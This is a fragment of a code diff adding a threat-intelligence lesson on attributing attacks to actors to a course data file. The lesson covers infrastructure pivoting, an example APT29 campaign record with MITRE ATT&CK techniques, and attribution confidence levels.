+  → Same IP hosted: other-c2.evil.org, phishing.bad.com
+
+WHOIS History:
+  Registrant patterns, email addresses, registrars
+  → Actors reuse registration details
+
+Certificate Transparency:
+  SSL certs on C2 servers share Subject/Issuer patterns
+  → JA3/JA3S fingerprints identify C2 frameworks
+
+Hosting Patterns:
+  Preferred ASNs, hosting providers, bulletproof hosts
+  → Infrastructure tendencies persist across campaigns
+\`\`\`
+
+## Campaign Tracking Framework
+
+\`\`\`
+Campaign Object:
+├── Campaign ID: APT29-2024-Q1-DIPLOMACY
+├── Threat Actor: Cozy Bear (APT29)
+├── Active Dates: 2024-01-15 to 2024-03-20
+├── Targets: European diplomatic organizations
+├── Malware Families:
+│   ├── EnvyScout (HTML smuggling dropper)
+│   ├── BoomBox (downloader)
+│   └── NativeZone (Cobalt Strike loader)
+├── Infrastructure:
+│   ├── 5 C2 domains
+│   ├── 3 IP addresses
+│   └── 2 legitimate compromised sites
+├── MITRE ATT&CK TTPs:
+│   ├── T1566.001 - Spearphishing Attachment
+│   ├── T1059.001 - PowerShell
+│   └── T1071.001 - Web Protocols
+└── Confidence: High (code reuse + infrastructure overlap)
+\`\`\`
+
+## Confidence Levels
+
+| Level | Criteria |
+|-------|----------|
+| Low | Single indicator overlap (e.g., shared IP) |
+| Medium | Multiple technical overlaps (code + infra) |
+| High | Technical + operational + historical consistency |
+| Confirmed | Intelligence community consensus or law enforcement |`,
+    keyTakeaways: [
+      "Attribution requires multiple independent overlapping indicators",
+      "Code similarity tools (BinDiff, ssdeep) link samples to families",
+      "Infrastructure tracking through passive DNS reveals actor patterns",
+      "Confidence levels prevent over-attribution from single data points"
+    ]
+  },
 ];
 
 export const getLessonContent = (courseId: string, lessonId: string): LessonContent | undefined => {
